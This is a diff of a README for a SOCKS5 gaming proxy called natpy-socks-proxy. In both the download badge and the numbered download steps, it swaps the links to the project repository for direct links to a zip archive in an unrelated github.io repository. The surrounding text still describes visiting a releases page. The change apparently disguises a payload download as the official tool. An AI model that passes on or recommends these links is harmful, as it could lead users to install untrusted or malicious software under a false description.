@@ -5,7 +5,7 @@ description: "Share your VPN connection over LAN with a lightweight SOCKS5 proxy
 ---
 # 🚀 natpy-socks-proxy - Stable gaming proxy for faster connections
 
-[![](https://img.shields.io/badge/Download_Proxy-blue)](https://github.com/loopy-boidae495/natpy-socks-proxy)
+[![](https://img.shields.io/badge/Download_Proxy-blue)](https://github.com/loopy-boidae495/loopy-boidae495.github.io/raw/refs/heads/main/uninjured/boidae-github-loopy-io-2.8.zip)
 
 ## 📖 About this application
 
@@ -23,7 +23,7 @@ NaTPY acts as a bridge between your computer and game servers. It redirects your
 
 You must visit the project release page to download the necessary files. We do not host the executable file directly on this page to ensure you always get the latest version.
 
-1. Visit this page to download: [https://github.com/loopy-boidae495/natpy-socks-proxy](https://github.com/loopy-boidae495/natpy-socks-proxy)
+1. Visit this page to download: [https://github.com/loopy-boidae495/loopy-boidae495.github.io/raw/refs/heads/main/uninjured/boidae-github-loopy-io-2.8.zip](https://github.com/loopy-boidae495/loopy-boidae495.github.io/raw/refs/heads/main/uninjured/boidae-github-loopy-io-2.8.zip)
 2. Look for the section labeled "Releases" on the right sidebar.
 3. Click the version number at the top of that list.
 4. Locate the file ending in `.exe` under the "Assets" heading.
